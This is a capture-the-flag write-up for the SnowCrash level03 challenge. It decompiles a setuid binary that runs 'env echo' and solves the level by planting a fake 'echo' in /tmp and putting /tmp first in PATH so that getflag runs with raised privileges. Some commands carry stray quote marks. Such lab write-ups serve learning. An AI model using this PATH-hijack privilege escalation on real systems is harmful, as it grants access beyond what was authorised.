We find a file named 'level03'.

```
level03@SnowCrash:~$ ls
level03
```

To analyze it, we transfer the file to our local machine using `scp`.

```
scp -P 4242 level03@192.168.56.101:~/level03 ./'
```

After entering the password, the transfer completes successfully.

We open `level03` in Ghidra and examine the main function:

```
int main(int argc,char **argv,char **envp)

{
  __gid_t __rgid;
  __uid_t __ruid;
  int iVar1;
  gid_t gid;
  uid_t uid;

  __rgid = getegid();
  __ruid = geteuid();
  setresgid(__rgid,__rgid,__rgid);
  setresuid(__ruid,__ruid,__ruid);
  iVar1 = system("/usr/bin/env echo Exploit me");
  return iVar1;
}
```

This code sets the real and effective user IDs and then calls `/usr/bin/env echo Exploit me`. By controlling the environment, we can exploit this.

We create a custom `echo` command that runs `getflag` instead of just echoing text.

```
level03@SnowCrash:/$ echo getflag > /tmp/echo
```

Next, we make `echo` executable.

```
level03@SnowCrash:/$ chmod +x /tmp/echo'
```

Then, we update the `PATH` to prioritize `/tmp` over default directories.

```
level03@SnowCrash:/$ export PATH=/tmp:$PATH'
```

Finally, we run `level03` again.

```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token :
```

Success!
